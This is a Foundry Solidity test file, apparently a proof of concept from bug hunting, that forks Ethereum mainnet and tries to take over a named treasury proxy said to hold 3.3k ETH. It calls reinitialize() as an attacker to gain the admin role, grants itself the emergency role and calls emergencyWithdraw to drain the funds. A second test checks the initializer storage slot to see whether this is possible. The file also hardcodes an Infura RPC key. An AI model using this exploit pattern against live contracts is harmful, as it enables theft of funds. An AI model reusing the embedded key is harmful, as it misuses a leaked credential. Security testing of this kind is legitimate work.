// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface ITreasury {
    function reinitialize() external;
    function emergencyWithdraw(uint256 amountWei) external;
    function withdrawEth(address to, uint256 amountWei) external returns (bool);
    function pause() external;
    function unpause() external;
    function hasRole(bytes32 role, address account) external view returns (bool);
    function grantRole(bytes32 role, address account) external;
    function getRoleAdmin(bytes32 role) external view returns (bytes32);
}

contract TreasuryExploit is Test {
    // Treasury proxy with 3.3k ETH
    address constant TREASURY_PROXY = 0xD7E4b67E735733aC98a88F13d087D8aac670E644;

    bytes32 constant DEFAULT_ADMIN_ROLE = 0x00;
    bytes32 constant DEPOSITOR_ROLE = keccak256("Depositor");
    bytes32 constant WITHDRAW_AUTHORITY_ROLE = keccak256("WithdrawAuthority");
    bytes32 constant PAUSER_ROLE = keccak256("Pauser");
    bytes32 constant STARTER_ROLE = keccak256("Starter");
    bytes32 constant UPGRADER_ROLE = keccak256("Upgrader");
    bytes32 constant EMERGENCY_ROLE = keccak256("Emergency");

    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
    }

    // CRITICAL TEST: Can we call reinitialize() to become admin?
    function testExploit_ReinitializeToAdmin() public {
        ITreasury treasury = ITreasury(TREASURY_PROXY);

        console.log("=== Treasury Reinitialize Exploit Test ===");
        console.log("Treasury Balance:", TREASURY_PROXY.balance);

        // Check current initialization state
        // The reinitializer(2) modifier prevents reinitialization if version >= 2

        // Check if attacker has any roles
        bool hasAdminBefore = treasury.hasRole(DEFAULT_ADMIN_ROLE, attacker);
        bool hasEmergencyBefore = treasury.hasRole(EMERGENCY_ROLE, attacker);

        console.log("Attacker has admin role before:", hasAdminBefore);
        console.log("Attacker has emergency role before:", hasEmergencyBefore);

        // Try to call reinitialize as attacker
        vm.startPrank(attacker);

        try treasury.reinitialize() {
            console.log("!!! REINITIALIZE SUCCEEDED !!!");

            // Check if attacker now has admin role
            bool hasAdminAfter = treasury.hasRole(DEFAULT_ADMIN_ROLE, attacker);
            console.log("Attacker has admin role after:", hasAdminAfter);

            if (hasAdminAfter) {
                console.log("!!! CRITICAL: Attacker is now admin !!!");

                // Grant emergency role to attacker
                treasury.grantRole(EMERGENCY_ROLE, attacker);
                console.log("Granted EMERGENCY_ROLE to attacker");

                // Now try emergency withdraw
                uint256 balance = TREASURY_PROXY.balance;
                if (balance > 0) {
                    console.log("Attempting emergency withdraw of", balance);
                    treasury.emergencyWithdraw(balance);
                    console.log("!!! DRAINED TREASURY !!!");
                    console.log("Attacker balance:", attacker.balance);
                }
            }
        } catch Error(string memory reason) {
            console.log("reinitialize() reverted:", reason);
        } catch (bytes memory) {
            console.log("reinitialize() reverted (no reason)");
        }

        vm.stopPrank();
    }

    // Alternative: Check the initialization storage slot directly
    function testCheck_InitializationState() public {
        console.log("=== Checking Initialization State ===");

        // ERC7201 Initializable storage location
        // keccak256(abi.encode(uint256(keccak256("openzeppelin.storage.Initializable")) - 1)) & ~bytes32(uint256(0xff))
        bytes32 INITIALIZABLE_STORAGE = 0xf0c57e16840df040f15088dc2f81fe391c3923bec73e23a9662efc9c229c6a00;

        bytes32 data = vm.load(TREASURY_PROXY, INITIALIZABLE_STORAGE);
        console.log("Initialization storage slot data:");
        console.logBytes32(data);

        // The _initialized value is the first uint64 in the struct
        uint64 initialized = uint64(uint256(data));
        console.log("Initialized version:", initialized);

        if (initialized < 2) {
            console.log("!!! POTENTIAL VULNERABILITY: reinitialize() may be callable !!!");
        } else if (initialized == type(uint64).max) {
            console.log("Initializers disabled (max value)");
        } else {
            console.log("Already initialized to version:", initialized);
        }
    }
}
